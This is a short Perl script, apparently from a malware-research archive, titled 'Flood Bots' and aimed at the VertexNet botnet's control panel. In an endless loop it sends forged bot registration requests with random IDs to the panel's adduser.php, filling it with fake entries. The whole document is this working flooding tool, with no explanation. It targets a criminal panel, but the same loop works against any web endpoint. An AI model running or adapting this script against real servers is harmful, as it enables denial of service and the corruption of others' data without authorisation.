

Type: Flood Bots

Author: [Xylitol](https://twitter.com/Xylit0l)

```
#!/usr/bin/perl
# VertexNet v1.1.1 Flood Bots
# http://www.virustotal.com/file-scan/report.html?id=fd373a8f4adf29001d282b963f126f760afcf3e58117f6024b2d65a36d41f617-1305491791
# Xyl2k! :þ

use HTTP::Request;
use LWP::UserAgent;

$URL = "http://localhost/Panel/adduser.php";

$useragent = LWP::UserAgent -> new();
$useragent -> agent('V32');

$try = 0;

        while(1)
        {
                $rnd = rand();

                $request = HTTP::Request -> new(GET => $URL . '?uid={' . $rnd . '}&lan=127.0.0.1&cmpname=Xyl2k!&country=Fran.ais%20(France)%20+33&cc=FR&idle=0&ver=v1337');
                $response = $useragent -> request($request);

                if ($response -> is_success)
                {
                                $try++;
                                print("[~] The fire day " . $try . "\n");
                }
        }
```
